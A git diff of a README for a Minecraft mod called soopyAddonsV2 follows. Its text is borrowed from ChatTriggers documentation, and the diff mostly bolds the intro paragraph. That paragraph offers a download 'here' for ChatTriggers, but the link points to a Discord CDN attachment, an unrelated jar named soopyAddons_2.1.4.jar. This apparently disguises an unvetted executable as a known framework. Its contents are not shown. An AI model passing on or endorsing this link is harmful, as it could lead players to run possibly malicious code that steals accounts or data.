@@ -1,6 +1,6 @@
 ## soopyAddonsV2
 #About
-ChatTriggers is a framework for Minecraft that allows for live scripting and client modification using JavaScript and you can download it [here](https://cdn.discordapp.com/attachments/985673669990826014/988457313973178378/soopyAddons_2.1.4.jar). We provide libraries, wrappers, objects and more to make your life as a modder as easy as possible. Even without the proper wrapper, you can still use exposed Minecraft methods and variables but you will need knowledge of FML mappings. The entire ChatTriggers engine is built on Rhino using Java 8 so you have access to any Rhino methods and functions. Rhino supports some ES6 features, as can be seen here.
+**ChatTriggers is a framework for Minecraft that allows for live scripting and client modification using JavaScript and you can download it [here](https://cdn.discordapp.com/attachments/985673669990826014/988457313973178378/soopyAddons_2.1.4.jar). We provide libraries, wrappers, objects and more to make your life as a modder as easy as possible. Even without the proper wrapper, you can still use exposed Minecraft methods and variables but you will need knowledge of FML mappings. The entire ChatTriggers engine is built on Rhino using Java 8 so you have access to any Rhino methods and functions. Rhino supports some ES6 features, as can be seen here.**
 
 The basic premise of ChatTriggers is that everything is based around Triggers. From a modding standpoint, Triggers can be thought of as event listeners. These can range from a chat Trigger that runs on a specific chat event matching criteria to a render overlay Trigger that runs when the crosshair is being rendered. We are constantly adding more Triggers and Trigger types as the mod evolves for more integration with Minecraft.
 
@@ -37,3 +37,5 @@ Feature Request
 Needs a general description of the feature requests
 Specifics on what is being requested (e.g. what class you want it in or what it should do) is highly recommended
 Duplicate issues will be merged to avoid too much clutter. If an issue is moved to "next" we will usually comment on it to explain how we expect to implement or fix that issue.
+
+
